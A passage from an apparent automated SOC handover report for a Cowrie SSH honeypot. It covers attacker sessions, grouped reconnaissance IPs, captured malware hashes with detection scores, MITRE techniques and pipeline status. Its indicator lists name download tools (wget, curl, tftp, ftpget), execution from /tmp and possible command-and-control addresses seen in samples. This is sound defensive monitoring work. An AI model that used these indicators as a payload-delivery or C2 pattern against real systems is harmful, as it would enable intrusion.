| **First Seen** | 2026-07-15 12:44 |
| **Last Seen** | 2026-07-15 12:44 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:44:13` | `cowrie.session.connect` |
| `2026-07-15 12:44:14` | `cowrie.client.version` |
| `2026-07-15 12:44:14` | `cowrie.client.kex` |
| `2026-07-15 12:44:16` | `cowrie.login.success` |
| `2026-07-15 12:44:17` | `cowrie.direct-tcpip.request` |
| `2026-07-15 12:44:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.97.253[.]246` to AbuseIPDB if not already reported
- [ ] Block `24.97.253[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61e197b56b35

| Field | Detail |
|---|---|
| **Source IP** | `218.58.73[.]238` |
| **First Seen** | 2026-07-15 12:44 |
| **Last Seen** | 2026-07-15 12:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:44:23` | `cowrie.session.connect` |
| `2026-07-15 12:44:24` | `cowrie.client.version` |
| `2026-07-15 12:44:24` | `cowrie.client.kex` |
| `2026-07-15 12:44:27` | `cowrie.login.success` |
| `2026-07-15 12:44:28` | `cowrie.direct-tcpip.request` |
| `2026-07-15 12:44:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.58.73[.]238` to AbuseIPDB if not already reported
- [ ] Block `218.58.73[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d72ecd91dd0

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-07-15 12:50 |
| **Last Seen** | 2026-07-15 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 12:50:55` | `cowrie.session.connect` |
| `2026-07-15 12:50:55` | `cowrie.client.version` |
| `2026-07-15 12:50:55` | `cowrie.client.kex` |
| `2026-07-15 12:50:56` | `cowrie.login.success` |
| `2026-07-15 12:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `143.198.233[.]61` | **29** | 2026-07-15 09:00 | 2026-07-15 12:28 | 13m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-07-15 09:16 | 2026-07-15 12:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]176` | **6** | 2026-07-15 11:00 | 2026-07-15 11:15 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.201.104[.]216` | **4** | 2026-07-15 12:10 | 2026-07-15 12:29 | 2m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]36` | **3** | 2026-07-15 11:18 | 2026-07-15 11:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]114` | **3** | 2026-07-15 11:18 | 2026-07-15 11:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]237` | **3** | 2026-07-15 11:19 | 2026-07-15 11:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.35.7[.]46` | **2** | 2026-07-15 09:32 | 2026-07-15 09:34 | 2m | 0 | `T1592` | 🟢 LOW |
| `128.203.204[.]199` | **2** | 2026-07-15 10:40 | 2026-07-15 10:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-15 12:33 | 2026-07-15 12:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.150.195[.]172` | **2** | 2026-07-15 08:56 | 2026-07-15 08:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `210.16.100[.]120` | **2** | 2026-07-15 11:47 | 2026-07-15 11:48 | 1m | 0 | `T1592` | 🟢 LOW |
| `94.102.49[.]155` | **2** | 2026-07-15 10:32 | 2026-07-15 10:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-07-15 09:13 | 2026-07-15 09:13 | 10s | 0 | `T1592` | 🟢 LOW |
| `115.190.83[.]181` | 1 | 2026-07-15 10:21 | 2026-07-15 10:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.212.232[.]185` | 1 | 2026-07-15 12:50 | 2026-07-15 12:50 | 12s | 0 | `T1592` | 🟢 LOW |
| `120.52.18[.]119` | 1 | 2026-07-15 09:32 | 2026-07-15 09:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.29.170[.]54` | 1 | 2026-07-15 12:36 | 2026-07-15 12:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.33.96[.]3` | 1 | 2026-07-15 11:47 | 2026-07-15 11:47 | 3s | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | 1 | 2026-07-15 10:55 | 2026-07-15 10:56 | 61s | 0 | `T1592` | 🟢 LOW |
| `180.169.100[.]182` | 1 | 2026-07-15 10:39 | 2026-07-15 10:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.5[.]112` | 1 | 2026-07-15 09:11 | 2026-07-15 09:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `188.168.86[.]6` | 1 | 2026-07-15 11:50 | 2026-07-15 11:50 | 6s | 0 | `T1592` | 🟢 LOW |
| `196.204.71[.]189` | 1 | 2026-07-15 10:44 | 2026-07-15 10:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `209.97.183[.]158` | 1 | 2026-07-15 09:44 | 2026-07-15 09:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `212.8.242[.]38` | 1 | 2026-07-15 10:31 | 2026-07-15 10:32 | 31s | 0 | `T1592` | 🟢 LOW |
| `39.130.240[.]179` | 1 | 2026-07-15 10:50 | 2026-07-15 10:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-07-15 09:45 | 2026-07-15 09:45 | 6s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]129` | 1 | 2026-07-15 09:11 | 2026-07-15 09:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-07-15 12:33 | 2026-07-15 12:33 | 1s | 0 | `T1592` | 🟢 LOW |
| `46.29.26[.]195` | 1 | 2026-07-15 11:29 | 2026-07-15 11:29 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `60.189.79[.]185` | 1 | 2026-07-15 12:54 | 2026-07-15 12:54 | 12s | 0 | `T1592` | 🟢 LOW |
| `66.175.213[.]4` | 1 | 2026-07-15 09:39 | 2026-07-15 09:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-07-15 09:38 | 2026-07-15 09:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `79.136.8[.]69` | 1 | 2026-07-15 09:40 | 2026-07-15 09:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]11` | 1 | 2026-07-15 09:03 | 2026-07-15 09:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]11` | 1 | 2026-07-15 10:32 | 2026-07-15 10:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `95.79.57[.]221` | 1 | 2026-07-15 09:16 | 2026-07-15 09:18 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 58/100 | 🟡 MEDIUM | **21/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `31.41.81[.]65` | PL | Telekom System sp.z o.o. | **100** ⚠️ | 50 |
| `178.178.222[.]52` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `122.170.111[.]140` | IN | ABTS-MUMBAI | **100** ⚠️ | 50 |
| `207.219.221[.]101` | CA | TELUS Communications Inc. | **100** ⚠️ | 50 |
| `39.130.240[.]179` | CN | China Mobile Communications Corporation | **100** ⚠️ | 21 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `64.72.74[.]162` | US | Zayo Bandwidth | **100** ⚠️ | 50 |
| `66.132.172[.]36` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `103.174.145[.]35` | IN | VAIDIK NETSOL OPC PVT LTD | **100** ⚠️ | 50 |
| `195.178.110[.]137` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 143 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 118 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 11 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 10 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 6 |

---

## 🔕 False Positive Summary (36 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 29 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 248 cases |
| Tool 34  | Credential Extractor        | ✅ 395 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 18 fingerprints |
| Tool 36  | Command Clustering          | ✅ 10 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 129 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 36 filtered (14.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 74 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 33 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 118 priority case(s) shown individually · 38 recon entry/entries in table (13 group(s) consolidating 69 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-15T13:51:35Z_
